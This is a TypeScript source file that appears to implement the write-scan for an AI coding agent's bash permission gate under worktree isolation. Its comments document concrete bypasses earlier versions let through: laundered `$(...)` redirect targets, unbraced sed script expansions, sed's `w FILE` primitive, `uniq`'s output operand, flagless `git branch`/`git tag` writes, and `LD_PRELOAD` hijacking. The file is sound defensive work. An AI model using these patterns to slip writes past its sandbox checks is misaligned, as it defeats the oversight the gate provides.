    '\x00': 'Null byte can truncate strings unexpectedly',
  };

  for (const char of command) {
    if (dangerous[char]) {
      return { char: '\\0', explanation: dangerous[char] };
    }
  }

  return null;
}

// ============================================================
// Write-target scan (worktree isolation)
// ============================================================

/**
 * A location a bash command may WRITE to, discovered from the AST.
 *
 * `{ kind: 'path', target }` is a concrete path the command steers a write to —
 * an output-redirect file, or a `git -C` / `--work-tree` operative directory.
 * The caller resolves it against the session's working directory.
 *
 * `{ kind: 'cwd' }` is a write that lands in the command's OWN working directory:
 * a non-read-only command with no redirect steering it elsewhere (`touch f`,
 * `git add`, `npm ci`), a git write with no `-C`/`--work-tree`, a command/
 * process substitution, an unsupported shell construct, or a parse failure. It
 * is the fail-closed vector — the caller cannot verify the write stays outside
 * the main checkout, so it treats it as landing in the working directory.
 */
export type BashWriteVector =
  | { kind: 'path'; target: string }
  | { kind: 'cwd' };

/**
 * Every location a bash command may write to, using the SAME bash-parser AST and
 * read-only classifier the permission gate uses to tell a write from a read.
 *
 * This is the machinery worktree isolation reuses to decide "writes to the main
 * checkout" (`worktrees.md` § How Claude Code enforces isolation, fetched
 * 2026-08-24): a Bash command "whose working directory resolves to the main
 * checkout, or whose working directory it can't verify stays outside it", and a
 * command "that redirects git into the main checkout" via `git -C` or an output
 * redirect. A command yields no write vector only if it PROVES it is read-only
 * ({@link commandProvenReadOnly}): the gate's own classifier
 * ({@link commandBaseIsReadOnly} — awk write/exec scripts and
 * `find -delete`/`-exec`-style dangerous args, then the read-only allowlist)
 * must agree, the head must be a key of {@link PROVEN_READ_FLAGS}, and every
 * argument must be proven. An unrecognised command or flag is a WRITE, so the
 * class cannot regrow as the read-only allowlist grows. Fail-closed by
 * construction: a read
 * contributes no vector, but anything it cannot trace — a command/process
 * substitution (in an argument OR a laundered redirect target such as
 * `> /tmp/$(echo ..)/../<main>/x`), an env-assignment prefix, an unsupported
 * construct, a parse error — contributes a `cwd` vector, matching the page's
 * "blocks a … command it can't verify stays inside the worktree".
 *
 * NOT a permission decision on its own — it does not know where the main
 * checkout is. It returns write locations; the caller resolves and judges them.
 */
export function scanBashWriteVectors(
  command: string,
  patterns: CompiledBashPattern[],
): BashWriteVector[] {
  let ast: ScriptNode;
  try {
    // `insertLOC` is asked for HERE and not on the Explore parse (:463) on
    // purpose: the quoting oracle it enables is only read by this pass, so the
    // permission gate's behaviour — and its allow-path proof — is untouched.
    // Measured before adopting it: over 4 894 commands, `insertLOC` changed
    // parse SUCCESS in 0 cases, so it adds locations and nothing else.
    ast = bashParser(command, { insertLOC: true }) as ScriptNode;
  } catch (error) {
    debug('[BashValidator] Write-scan parse error (fail closed):', error);
    return [{ kind: 'cwd' }];
  }
  const vectors: BashWriteVector[] = [];
  collectWriteVectors(ast, patterns, vectors, command);
  return vectors;
}

/** Recurse the AST, mirroring the node types {@link validateNode} handles. */
function collectWriteVectors(
  node: ASTNode,
  patterns: CompiledBashPattern[],
  out: BashWriteVector[],
  source: string,
): void {
  switch (node.type) {
    case 'Script':
      for (const cmd of (node as ScriptNode).commands) collectWriteVectors(cmd, patterns, out, source);
      return;
    case 'CompoundList':
      for (const cmd of (node as CompoundListNode).commands) collectWriteVectors(cmd, patterns, out, source);
      return collectCompoundRedirectVectors(node as CompoundListNode, out);
    case 'Pipeline':
      for (const cmd of (node as PipelineNode).commands) collectWriteVectors(cmd, patterns, out, source);
      return;
    case 'LogicalExpression': {
      const logical = node as LogicalExpressionNode;
      collectWriteVectors(logical.left, patterns, out, source);
      collectWriteVectors(logical.right, patterns, out, source);
      return;
    }
    case 'Subshell':
      collectWriteVectors((node as SubshellNode).list, patterns, out, source);
      return collectCompoundRedirectVectors(node as SubshellNode, out);
    case 'Command':
      collectCommandWriteVectors(node as CommandNode, patterns, out, source);
      return;
    default:
      // Unknown/unsupported construct (If/While/For/Case/Function, …) — the same
      // node types {@link validateNode} blocks for read-only mode. It can hide a
      // write, so fail closed with a cwd vector.
      out.push({ kind: 'cwd' });
  }
}

/**
 * The git flags that redirect the WORKING TREE — the scope isolation protects.
 * `--git-dir` and `GIT_DIR` move the metadata but NOT the work tree, so a write
 * git carrying only those still writes its tree in the cwd; that is left to the
 * cwd fallback rather than treated as an escape.
 */
function extractGitWorktreeDirs(words: string[]): string[] {
  const dirs: string[] = [];
  for (let i = 1; i < words.length; i++) {
    const word = words[i];
    if (word === undefined) continue;
    if (word === '-C' || word === '--work-tree') {
      const value = words[i + 1];
      // A flag with no operand is malformed; leaving it unrecorded lets the
      // caller fall back to the cwd vector, which fails closed.
      if (value !== undefined) { dirs.push(value); i++; }
    } else if (word.startsWith('--work-tree=')) {
      dirs.push(word.slice('--work-tree='.length));
    } else if (word.startsWith('-C') && word.length > 2) {
      dirs.push(word.slice(2));
    }
  }
  return dirs;
}

/** Collect the write vectors of one simple command. */
function collectCommandWriteVectors(
  node: CommandNode,
  patterns: CompiledBashPattern[],
  out: BashWriteVector[],
  source: string,
): void {
  // Background execution — the same construct {@link validateCommand} refuses.
  // A detached write can't be traced, so fail closed.
  if (node.async) { out.push({ kind: 'cwd' }); return; }

  const words: string[] = [];
  // Parallel to `words`, so a check can ask the AST about the WORD behind a
  // string rather than re-deriving the answer from its text.
  const wordNodes: (WordNode | undefined)[] = [];
  // Set for anything we cannot resolve to a definite location: a command/process
  // substitution, a laundered redirect target, or an env-assignment prefix. Each
  // can write we-can't-say-where, so it fails closed to the working directory.
  let untraceable = false;

  const scanWord = (word: WordNode): void => {
    for (const exp of word.expansion ?? []) {
      if (exp.type === 'CommandExpansion' || exp.type === 'ProcessSubstitution') untraceable = true;
    }
  };
  const handleRedirect = (redirect: RedirectNode): void => {
    // Reuse the gate's own read/write redirect oracle: input redirects,
    // `/dev/null` and fd-duplication write nothing.
    if (isRedirectSafe(redirect)) return;
    // A redirect TARGET carrying a command/process substitution is untraceable:
    // `expandPath` cannot run `$(...)` and `normalize` only collapses literal
    // `..`, so `> /tmp/$(echo ..)/../<main>/x` resolves OUTSIDE the repo (and
    // would be allowed) while the shell writes INSIDE it. Fail closed.
    for (const exp of redirect.file?.expansion ?? []) {
      if (exp.type === 'CommandExpansion' || exp.type === 'ProcessSubstitution') { untraceable = true; return; }
    }
    const target = redirect.file?.text ?? '';
    out.push(target.trim() ? { kind: 'path', target } : { kind: 'cwd' });
  };

  if (node.name) { scanWord(node.name); words.push(node.name.text); wordNodes.push(node.name); }
  for (const item of node.prefix ?? []) {
    if (item.type === 'Redirect') handleRedirect(item as RedirectNode);
    // An environment-assignment prefix is what {@link validateCommand} refuses
    // outright: `GIT_DIR`/`GIT_WORK_TREE` redirect git into the main checkout
    // (worktrees.md:91), and `PATH`/`LD_PRELOAD` hijack which binary runs. Its
    // effect is untraceable, so fail closed — matching the real gate, which
    // treats any env-assignment command as not read-only.
    else if (item.type === 'AssignmentWord') untraceable = true;
  }
  for (const item of node.suffix ?? []) {
    if (item.type === 'Redirect') handleRedirect(item as RedirectNode);
    else if (item.type === 'Word') {
      scanWord(item as WordNode);
      words.push((item as WordNode).text);
      wordNodes.push(item as WordNode);
    }
  }

  // A sed SCRIPT delivered through a PARAMETER EXPANSION is not the text that
  // was scanned (P2.120): `sed -n "$X" f` was proven read-only because
  // {@link sedScriptMayWriteFile} scans the script TEXT, and an unbraced
  // expansion is not one. `${X}` was caught only incidentally (braces are
  // {@link UNRESOLVABLE_OPERAND_METACHAR}) and `$(…)` as a CommandExpansion, so
  // exactly the unbraced form slipped.
  //
  // The AST is the right oracle here and a character class is NOT: the TEXT of
  // `sed -n '$p' f` and of `sed -n "$p" f` both contain a `$`, but only the
  // second is an expansion — the first is sed's last-line address, an idiom
  // this repository's own scripts use. Refusing on the character would have
  // over-blocked it; refusing on the recorded expansion does not.
  if (SED_COMMANDS.has(node.name?.text.toLowerCase() ?? '')) {
    for (const script of sedScripts(words)) {
      for (const exp of wordNodes[script.wordIndex]?.expansion ?? []) {
        if (exp.type === 'ParameterExpansion' && !isHostComputedPluginPathExpansion(exp)) {
          untraceable = true;
        }
      }
    }
  }

  if (untraceable) { out.push({ kind: 'cwd' }); return; }

  // The command yields no write vector ONLY if it PROVES it is read-only. This
  // is the structural inversion: a negative list of known-dangerous args
  // ("not in DANGEROUS_COMMAND_ARGS") re-opened the hole for every allowlisted
  // command whose write flag was missing from it (`sort -o`, `yq -i`, `xq -i`),
  // and it regrew as the allowlist grew. Proof is required instead, so an
  // unrecognised command or an unrecognised flag falls to the write side.
  // The word indices whose ORIGINAL SOURCE proves their glob/brace
  // metacharacters are literal. Computed here because this is the only place
  // that holds both the AST words and the text they were cut from.
  const shellLiteralWords = new Set<number>();
  for (let i = 0; i < wordNodes.length; i++) {
    const loc = wordNodes[i]?.loc;
    if (loc === undefined) continue;
    if (wordMetacharactersAreLiteral(source.slice(loc.start.char, loc.end.char + 1))) {
      shellLiteralWords.add(i);
    }
  }

  if (commandProvenReadOnly(node.name?.text, words, patterns, shellLiteralWords)) return;

  // A write. Where does it land?
  if (node.name?.text.toLowerCase() === 'git') {
    const dirs = extractGitWorktreeDirs(words);
    if (dirs.length > 0) { for (const dir of dirs) out.push({ kind: 'path', target: dir }); return; }
    // git with no working-tree redirect writes its tree in the working directory.
    out.push({ kind: 'cwd' });
    return;
  }
  // Any other write command (touch, sed -i, npm, a bare interpreter, …) writes
  // relative to the working directory.
  out.push({ kind: 'cwd' });
}

/**
 * Whether a command's NAME + ARGS (redirects excluded) are a read, judged by the
 * SAME checks {@link validateCommand} makes: awk write/exec scripts
 * ({@link getDangerousAwkReason}) and program-level dangerous args
 * ({@link DANGEROUS_COMMAND_ARGS}, e.g. `find -delete`/`-exec`) disqualify a
 * command BEFORE the read-only allowlist is consulted. Reusing this machinery —
 * not `patterns.some(regex.test)` — is what keeps a write-capable `find`/`awk`
 * from classifying as a read (the fail-open escapes the raw-regex path allowed).
 */
function commandBaseIsReadOnly(
  name: string | undefined,
  words: string[],
  patterns: CompiledBashPattern[],
): boolean {
  if (!name) return false;
  const normalized = programNameKey(name); // UA12.215 follow-up: a trailing .exe dropped
  if (AWK_COMMANDS.has(normalized) && getDangerousAwkReason(words) !== null) return false;
  if (argvInspectorReason(normalized, words) !== null) return false; // sed, sort, gh api (UA12.72), rg (UA12.215), grep (UA12.216)
  const dangerousArgs = DANGEROUS_COMMAND_ARGS[normalized];
  if (dangerousArgs && words.some(word => dangerousArgs.has(word))) return false;
  const commandStr = words.join(' ');
  return commandStr.trim().length > 0 && patterns.some(pattern => pattern.regex.test(commandStr));
}

// ============================================================
// Isolation-time read PROOF (the positive determination)
// ============================================================

const readFlags = (spec: string): ReadonlySet<string> =>
  new Set(spec.split(/\s+/).filter(Boolean));

/**
 * The commands a write-scan may conclude are reads, and for each the flags
 * PROVEN not to designate a write destination.
 *
 * ## Why a positive list
 *
 * The read-only allowlist answers "may this command run in Plan or Don't ask", which
 * is a question about the command NAME. It cannot answer "does this command
 * write", because for most of its 118 entries that depends on a flag: `sort` is
 * a read until `-o`, `yq`/`xq` until `-i`, `xmllint` until `--output`. Deciding
 * writes from a NEGATIVE list of known-dangerous args therefore re-opened the
 * hole for every allowlisted command whose write flag nobody had enumerated
 * yet, and re-opened it again on every allowlist addition. Two review rounds
 * found five such escapes each.
 *
 * So the direction is inverted, and the inversion is the fix: a command is a
 * read only if it is a KEY here AND every flag-shaped argument it carries is in
 * that key's set. Two consequences, both wanted:
 * - a command absent from this map (an interpreter, a package manager, `sed`
 *   before its entry, a newly allowlisted tool) is a WRITE, so the next
 *   allowlist addition cannot silently reopen the class;
 * - an unrecognised flag on a listed command is a WRITE, so a tool that grows a
 *   new in-place flag is covered before anyone edits this file.
 *
 * This is the owner's standing "dumber and stricter for security parsing" rule:
 * anything we cannot prove falls to the safe side. It applies ONLY here, on the
 * isolation write-scan — the read-only allowlist's classification is untouched, and with
 * `bgIsolation:'none'` (our default) this code never runs.
 *
 * Flags are omitted deliberately where a tool's own flag WRITES or EXECUTES:
 * `sort -o/--output`, `yq`/`xq` `-i/--inplace` (and `-o`, whose meaning is
 * output-FORMAT but which reads as an output file — ambiguity falls to the safe
 * side), `xmllint --output/--shell`, `sed -i/--in-place`, `fd -x/-X/--exec`,
 * `awk -f` and `sed -f` (a program file whose contents we cannot see),
 * `date -s`, `find`'s `-delete`/`-exec`/`-fprintf` family (also caught by
 * {@link DANGEROUS_COMMAND_ARGS}, deliberately double-covered), and `env`
 * (`env FOO=1 cmd` runs a command; `printenv`, which only prints, is listed).
 */
const PROVEN_READ_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  // --- listing / file metadata ---
  ['ls', readFlags('-l -a -A -h -R -t -r -S -1 -d -F -i -n -p -G -o --all --almost-all --human-readable --long --reverse --recursive --time --sort --color --format --classify --directory --inode --numeric-uid-gid')],
  ['ll', readFlags('-l -a -A -h -R -t -r -S -1 -d -F -i -n -p -G -o --all --human-readable --reverse --recursive --color')],
  ['la', readFlags('-l -a -A -h -R -t -r -S -1 -d -F -i -n -p -G -o --all --human-readable --reverse --recursive --color')],
  ['tree', readFlags('-L -a -d -f -i -F -P -I -C -n -h --noreport --charset --dirsfirst')],
  ['file', readFlags('-b -i -L -h -s -z --mime --mime-type --brief')],
  ['stat', readFlags('-c -f -t -L --format --printf --dereference --terse')],
  ['du', readFlags('-h -s -k -m -a -c -b -d -x -L --max-depth --human-readable --summarize --total')],
  ['df', readFlags('-h -k -m -i -T -a -l -P --human-readable --portability')],
  // --- reading file contents ---
  ['cat', readFlags('-n -b -e -s -t -v -A -E -T --number --squeeze-blank --show-all')],
  ['head', readFlags('-n -c -q -v --lines --bytes --quiet --verbose')],
  ['tail', readFlags('-n -c -q -v -f -F --lines --bytes --follow --quiet')],
  ['wc', readFlags('-l -c -w -m -L --lines --bytes --words --chars --max-line-length')],
  ['nl', readFlags('-b -n -w -s -v -i')],
  ['less', readFlags('-N -S -R -F -X -i -M')],
  ['more', readFlags('-d -f -p -s')],
  ['bat', readFlags('-n -p -A -l --style --language --plain --number --color')],
  // --- search ---
  ['find', readFlags('-name -iname -path -ipath -wholename -regex -iregex -type -xtype -maxdepth -mindepth -depth -prune -print -print0 -printf -ls -size -empty -perm -user -uid -group -gid -nouser -nogroup -links -inum -samefile -newer -newermt -newerct -anewer -cnewer -mtime -mmin -atime -amin -ctime -cmin -used -true -false -not -and -or -a -o -follow -xdev -mount -quit -H -L -P -E -s -d')],
  ['locate', readFlags('-i -l -b -c -r --ignore-case --limit --basename')],
  ['grep', readFlags('-r -R -n -i -l -L -c -v -E -F -G -P -w -x -o -h -H -e -a -s -q -m -A -B -C -I -T -z -Z -U -b --include --exclude --exclude-dir --color --line-number --recursive --ignore-case --files-with-matches --files-without-match --count --invert-match --extended-regexp --fixed-strings --word-regexp --only-matching --max-count --after-context --before-context --context --no-filename --with-filename --binary-files')],
  ['rg', readFlags('-e -i -n -N -l -c -v -w -x -o -F -S -s -u -U -t -T -g -A -B -C -H -h -p -P -z -L -r -m -j --hidden --no-ignore --glob --type --type-not --files --files-with-matches --files-without-match --count --count-matches --line-number --no-heading --heading --color --smart-case --ignore-case --fixed-strings --multiline --json --max-count --context --after-context --before-context --sort --no-filename --with-filename --replace --only-matching --word-regexp')],
  ['ag', readFlags('-i -l -Q -w -A -B -C -g -G -s -u -v -c -o -f -p --nogroup --nocolor --group --color --ignore --hidden --literal --case-sensitive --files-with-matches --count')],
  ['ack', readFlags('-i -l -L -w -Q -v -c -o -h -H -A -B -C -g --nogroup --nocolor --group --color --ignore-dir --type --files-with-matches --count --literal')],
  ['fd', readFlags('-t -e -H -I -g -p -a -l -d -c -u -s -F --type --extension --hidden --no-ignore --glob --absolute-path --max-depth --color --full-path --case-sensitive --fixed-strings')],
  ['which', readFlags('-a --all')],
  ['whereis', readFlags('-b -m -s -u')],
  ['type', readFlags('-a -t -P -p -f')],
  // --- text pipelines (stdout only) ---
  ['sort', readFlags('-n -r -u -k -t -f -b -g -h -M -V -c -C -s -z -d -i --numeric-sort --reverse --unique --key --field-separator --ignore-case --general-numeric-sort --human-numeric-sort --month-sort --version-sort --check --stable --zero-terminated --dictionary-order --ignore-leading-blanks')],
  ['uniq', readFlags('-c -d -D -u -i -f -s -w -z --count --repeated --unique --ignore-case --skip-fields --skip-chars --check-chars')],
  ['cut', readFlags('-d -f -c -b -s -z --delimiter --fields --characters --bytes --only-delimited --complement')],
  ['tr', readFlags('-d -s -c -C -t --delete --squeeze-repeats --complement --truncate-set1')],
  ['column', readFlags('-t -s -c -x -n --table --separator')],
  ['sed', readFlags('-n -E -e -r -s -z --quiet --silent --expression --regexp-extended --separate --null-data')],
  ['awk', readFlags('-F -v --field-separator --assign')],
  ['gawk', readFlags('-F -v --field-separator --assign')],
  ['mawk', readFlags('-F -v --field-separator --assign')],
  ['nawk', readFlags('-F -v --field-separator --assign')],
  // --- structured data (stdout only) ---
  ['jq', readFlags('-r -c -e -n -s -a -S -j -M -C -R --arg --argjson --slurp --raw-output --raw-input --compact-output --tab --indent --null-input --exit-status --args --jsonargs --sort-keys --join-output --monochrome-output --color-output --ascii-output')],
  ['yq', readFlags('-r -e -n -N -P -M -C -p --raw-output --exit-status --null-input --no-colors --prettyPrint --input-format')],
  ['xq', readFlags('-r -e -n -N -P -M -C -p --raw-output --exit-status --null-input --no-colors --prettyPrint --input-format')],
  ['xmllint', readFlags('--noout --xpath --format --schema --valid --dtdvalid --nowarning --recover --encode')],
  ['json_pp', readFlags('-f -t -json_opt')],
  // --- shell/system information ---
  ['echo', readFlags('-n -e -E')],
  ['pwd', readFlags('-L -P')],
  ['whoami', readFlags('')],
  ['id', readFlags('-u -g -G -n -r -a')],
  ['groups', readFlags('')],
  ['uname', readFlags('-a -s -r -v -m -n -p -o -i')],
  ['hostname', readFlags('-s -f -i -I -d')],
  ['date', readFlags('-u -R -I -r -d --utc --rfc-3339 --iso-8601 --date --reference')],
  ['uptime', readFlags('-p -s -h')],
  ['printenv', readFlags('-0 --null')],
  ['ps', readFlags('-e -f -a -u -x -l -o -p -A -H -w -j -T --pid --format --sort')],
  ['top', readFlags('-b -n -u -p -d -l -o -s')],
  ['htop', readFlags('-b -u -p -d -s -C')],
  ['free', readFlags('-h -m -g -k -b -s -t -w')],
  ['vmstat', readFlags('-a -d -f -s -w -S')],
  ['iostat', readFlags('-c -d -x -h -k -m -t -z')],
  ['lscpu', readFlags('-a -b -c -e -p -x -J -y --json --extended --parse')],
  ['lsmem', readFlags('-a -b -J -o --json --output')],
  ['lsblk', readFlags('-a -b -f -l -o -p -t -J -d -n --json --output --fs --list')],
  ['lsusb', readFlags('-v -t -s -d')],
  ['lspci', readFlags('-v -vv -k -nn -t -s -d')],
  // `git` proves READ through its SUBCOMMAND, which the read-only allowlist
  // pattern already scopes to `status|log|diff|show|…`; a write subcommand
  // (`add`, `commit`) never reaches this map because the pattern rejects it, and
  // the caller's git branch then resolves `-C`/`--work-tree` into path vectors.
  // `-c` is deliberately absent: `git -c <key>=<value>` injects configuration.
  ['git', readFlags('-C --no-pager --paginate --literal-pathspecs --no-optional-locks'
    // …plus the flags the READ subcommands themselves take. `--output`,
    // `--output-directory` and `-o` are omitted on purpose: they are git's own
    // write-to-file flags (`git diff --output=x`, `git format-patch -o dir`).
    // `-c` is omitted too — `git -c <key>=<value>` injects configuration.
    + ' --oneline --graph --decorate --no-decorate --all --branches --tags --remotes'
    + ' --stat --numstat --shortstat --name-only --name-status --raw --summary'
    + ' -p -u -s --patch --no-patch --unified --word-diff --color-words'
    + ' --short --porcelain --branch --long --untracked-files --ignored'
    + ' --pretty --format --abbrev-commit --no-abbrev-commit --date --relative-date'
    + ' --since --after --until --before --author --committer --grep --regexp-ignore-case'
    + ' --follow --reverse --first-parent --no-merges --merges --max-count --skip -n'
    + ' --cached --staged --merge-base --find-renames --find-copies --diff-filter'
    + ' --src-prefix --dst-prefix --no-color --color --no-ext-diff --text --binary'
    + ' --numbered --no-renames -M -R -B -w -b --ignore-all-space --ignore-space-change')],
]);

/**
 * git's read proof is decided by its SUBCOMMAND, not by its flags alone.
 *
 * ## Why a flat flag set was not enough (measured 2026-08-26)
 *
 * {@link PROVEN_READ_FLAGS} answers "is this flag a write destination", and for
 * git that question is under-determined, in BOTH directions:
 *
 * - It over-blocked six everyday reads the read-only allowlist explicitly
 *   permits — `git remote -v`, `git branch -a`, `git tag -l`,
 *   `git config --get user.name`, `git config -l`, `git blame -L 1,10 <file>`
 *   (P2.112). Their flags were simply absent from git's set.
 * - It fail-OPENED on the OPERAND axis, which no flag set can see. `git branch
 *   <name>` CREATES a branch, `git tag <name>` CREATES a tag, and
 *   `git remote add <name> <url>` rewrites the repository's config — all three
 *   carry no flag at all, all three matched the allowlist's `branch|tag|remote`
 *   alternatives, and all three were therefore PROVEN READ-ONLY and allowed
 *   under active isolation. Live probe in a scratch repository: `git branch
 *   newbranch` and `git tag v9` both really wrote.
 *
 * Widening the flat set would have made the second problem WORSE: `-a` is the
 * spelling `git branch -a` needs AND the spelling `git tag -a <name>` uses to
 * create an annotated tag. The two answers only separate per subcommand, which
 * is what this map is.
 *
 * `operandsAreInputs: false` is the declaration that an operand here SELECTS AN
 * ACTION rather than naming an input, so a proven read must carry none. A
 * subcommand absent from this map is not a proven read at all, so the axis is
 * self-closing in the same way the flag and operand axes already are.
 */
interface GitSubcommandPolicy {
  /** Flags this READ subcommand may carry, on top of git's global set. */
  readonly flags: ReadonlySet<string>;
  /** Flags that consume the NEXT word, so its value is not read as an operand. */
  readonly valueFlags: ReadonlySet<string>;
  /** Whether an operand is an INPUT (a path/rev) rather than an action. */
  readonly operandsAreInputs: boolean;
}

const GIT_NO_FLAGS: ReadonlySet<string> = readFlags('');

const gitReads = (
  flags: string,
  operandsAreInputs: boolean,
  valueFlags = '',
): GitSubcommandPolicy => ({
  flags: readFlags(flags),
  valueFlags: readFlags(valueFlags),
  operandsAreInputs,
});

const GIT_READ_SUBCOMMANDS: ReadonlyMap<string, GitSubcommandPolicy> = new Map([
  // Operands are revisions and pathspecs — inputs.
  ['status', gitReads('', true)],
  ['log', gitReads('-L', true)],
  ['diff', gitReads('', true)],
  ['show', gitReads('', true)],
  ['describe', gitReads('', true)],
  ['rev-parse', gitReads('', true)],
  ['ls-files', gitReads('', true)],
  ['ls-tree', gitReads('', true)],
  ['ls-remote', gitReads('', true)],
  ['shortlog', gitReads('', true)],
  ['whatchanged', gitReads('', true)],
  ['cherry', gitReads('', true)],
  ['blame', gitReads('-L', true)],
  ['annotate', gitReads('-L', true)],
  ['history', gitReads('', true)],
  // Operands SELECT AN ACTION — a proven read carries none.
  // `branch`: `-a`/`--all`/`-r`/`--remotes`/`-v` list; `-l` is deliberately
  // ABSENT because in git before 2.28 `git branch -l` is `--create-reflog`.
  ['branch', gitReads('-a --all -r --remotes -v --verbose --list', false)],
  // `tag`: `-l`/`--list` lists. `-a` is ABSENT — it CREATES an annotated tag —
  // and so is `-v`, which shells out to gpg to verify a signature.
  ['tag', gitReads('-l --list', false)],
  ['remote', gitReads('-v --verbose', false)],
  ['config', gitReads('-l --list --get --get-all --get-regexp', false,
    '--get --get-all --get-regexp')],
  ['reflog', gitReads('', false)],
  ['stash', gitReads('', false)],
]);

/**
 * The flag set a git invocation may carry, or null when it is not a proven read.
 *
 * Fails closed at every step: an unknown subcommand, a missing subcommand, a
 * malformed global flag, or an operand on an action-selecting subcommand all
 * return null.
 */
function gitProvenReadFlags(
  words: string[],
  globalFlags: ReadonlySet<string>,
): ReadonlySet<string> | null {
  let i = 1;
  // git's own global flags precede the subcommand; these three take a value.
  while (i < words.length) {
    const word = words[i];
    if (word === undefined) return null;
    if (!word.startsWith('-') || word.length === 1) break;
    if (word === '-C' || word === '--work-tree' || word === '--git-dir') i++;
    i++;
  }
  const subcommand = words[i];
  if (subcommand === undefined) return null;
  const policy = GIT_READ_SUBCOMMANDS.get(subcommand);
  if (policy === undefined) return null;
  i++;
  // `git stash list` is the two-word phrase the allowlist spells, so the literal
  // `list` belongs to the subcommand and is not an operand.
  if (subcommand === 'stash') {
    if (words[i] !== 'list') return null;
    i++;
  }
  const allowed: ReadonlySet<string> = policy.flags === GIT_NO_FLAGS
    ? globalFlags
    : new Set([...globalFlags, ...policy.flags]);
  if (policy.operandsAreInputs) return allowed;
  for (; i < words.length; i++) {
    const word = words[i];
    if (word === undefined) continue;
    if (word.startsWith('-') && word.length > 1) {
      if (!word.includes('=') && policy.valueFlags.has(word)) i++;
      continue;
    }
    return null;
  }
  return allowed;
}

/**
 * Whether one FLAG is proven not to designate a write destination.
 *
 * A flag must be named in the command's set — under four spellings the same
 * flag legitimately takes: `--name=value`, a short flag with its value attached
 * (`-n5`), bundled short flags (`-ln`, where EVERY bundled letter must be
 * proven), and a numeric count (`-5`, never a path).
 *
 * ## What this function does NOT decide (the invariant, corrected)
 *
 * This used to claim "a positional argument is an input, never a destination,
 * for every command in {@link PROVEN_READ_FLAGS}". THAT WAS FALSE, and a false
 * invariant in a security comment is its own defect — it is what the next
 * maintainer trusts. Two measured counter-examples, both of which RAN and
 * destroyed a file under isolation:
 * - `uniq in.txt OUTPUT` — POSIX gives `uniq` the form
 *   `uniq [OPTION]... [INPUT [OUTPUT]]`, so its SECOND OPERAND is an output
 *   file, and it TRUNCATES;
 * - `sed -n 'w FILE' in.txt` — the positional SCRIPT carries sed's own write
 *   primitive (`w FILE`, `s///w FILE`), the exact analogue of the
 *   `awk 'BEGIN{print > FILE}'` case.
 *
 * The true invariant: **a positional argument is an input EXCEPT where measured
 * otherwise**, and the two exceptions are bounded by an audit of all
 * {@link PROVEN_READ_FLAGS} keys (2026-08-24) — `uniq` is the only command with
 * an output OPERAND, `sed` the only unguarded SCRIPT carrier (`jq`/`yq`/`xq`
 * have no write primitive without `-i`; `awk` and `find` are already covered by
 * {@link getDangerousAwkReason} and {@link DANGEROUS_COMMAND_ARGS}). Both are
 * handled by {@link commandProvenReadOnly}, not here. A command ADDED to the map
 * must be audited on this axis too — an operand that names a destination is not
 * something the flag check can see.
 */
function flagIsProvenSafe(token: string, safe: ReadonlySet<string>): boolean {
  if (token === '-' || token === '--') return true;
  if (!token.startsWith('-')) return true;
  const named = token.includes('=') ? token.slice(0, token.indexOf('=')) : token;
  if (safe.has(named)) return true;
  if (named.startsWith('--')) return false;
  // A purely numeric short flag is a COUNT, never a path: `git log -5`,
  // `head -5`, `tail -20`. No command spells an output file this way.
  if (/^-\d+$/.test(named)) return true;
  const shortWithValue = /^-([A-Za-z])\d+$/.exec(named);
  if (shortWithValue) {
    const letter = shortWithValue[1];
    return letter !== undefined && safe.has(`-${letter}`);
  }
  if (/^-[A-Za-z]+$/.test(named)) {
    return [...named.slice(1)].every(letter => safe.has(`-${letter}`));
  }
  return false;
}

/**
 * Whether a command PROVES it is read-only, for the isolation write-scan.
 *
 * Three conditions, all required: the base classifier the permission gate uses
 * says read-only ({@link commandBaseIsReadOnly} — awk write/exec scripts,
 * `find -delete`/`-exec`, then the allowlist), the head is a key of
 * {@link PROVEN_READ_FLAGS}, and every argument is proven
 * ({@link flagIsProvenSafe}). Anything else is a write, which is what makes the
 * class closed rather than patched command by command.
 */
function commandProvenReadOnly(
  name: string | undefined,
  words: string[],
  patterns: CompiledBashPattern[],
  shellLiteralWords: ReadonlySet<number> = new Set(),
): boolean {
  if (!name) return false;
  if (!commandBaseIsReadOnly(name, words, patterns)) return false;
  const normalized = name.toLowerCase();
  const declared = PROVEN_READ_FLAGS.get(normalized);
  if (declared === undefined) return false;
  // git's proof is subcommand-scoped: it both WIDENS the flag set (the read
  // flags each read subcommand takes) and BOUNDS the operands (an operand on
  // `branch`/`tag`/`remote`/`reflog`/`stash` selects an action). See
  // {@link GIT_READ_SUBCOMMANDS}.
  const safe = normalized === 'git' ? gitProvenReadFlags(words, declared) : declared;
  if (safe === null) return false;
  if (!words.slice(1).every(word => flagIsProvenSafe(word, safe))) return false;
  // The OPERAND axis, which the flag check above cannot see (see
  // {@link flagIsProvenSafe}'s corrected invariant): a script that carries a
  // write primitive, and an operand that IS an output file.
  if ((normalized === 'sed' && sedScriptMayWriteFile(words, shellLiteralWords)) || unquotedGlobReason(normalized, words, index => shellLiteralWords.has(index)) !== null) return false; // UA12.207, UA12.212 (+ follow-up: every head but globSafeHead's)
  // The OPERAND axis must be DECLARED, not defaulted — delegated to the pure,
  // exported {@link operandPolicyProvesRead} so the fail-closed branch has a
  // test surface (the declarations are module-private, and with every key
  // declared there is no undeclared key to drive it from outside).
  return operandPolicyProvesRead(normalized, words);
}

/**
 * The sed scripts a command carries, and nothing else.
 *
 * `sed [-n] SCRIPT [FILE…]`: the script is the FIRST operand, plus the operand
 * of every `-e`/`--expression`. Filenames are deliberately EXCLUDED — scanning
 * them would refuse `sed -n 'p' warnings.txt` for the `w` in its filename.
 */
interface SedScript {
  /** Index in `words` of the WORD that carries this script. */
  readonly wordIndex: number;
  /** The script text itself (the value part of `-e…`/`--expression=…`). */
  readonly text: string;
}

function sedScripts(words: string[]): SedScript[] {
  const scripts: SedScript[] = [];
  // With `-e`/`--expression` present, POSIX says ALL operands are files — so
  // seeing one must retire the first-operand-is-the-script rule. It did not
  // (P2.121), and the first FILENAME was scanned as a script: `sed -n -e 'p'
  // warnings.txt` was refused for the `w` in `warnings.txt`, and after the glob
  // rule arrived `sed -n -e 'p' *.log` was refused too, while the control
  // `sed -n 'p' warnings.txt` was allowed. Setting the flag here strictly
  // REDUCES over-blocking and opens no hole: an `-e` script is still scanned.
  let sawScriptOperand = false;
  for (let i = 1; i < words.length; i++) {
    const word = words[i];
    if (word === undefined) continue;
    if (word === '-e' || word === '--expression') {
      const value = words[i + 1];
      if (value !== undefined) { scripts.push({ wordIndex: i + 1, text: value }); i++; }
      sawScriptOperand = true;
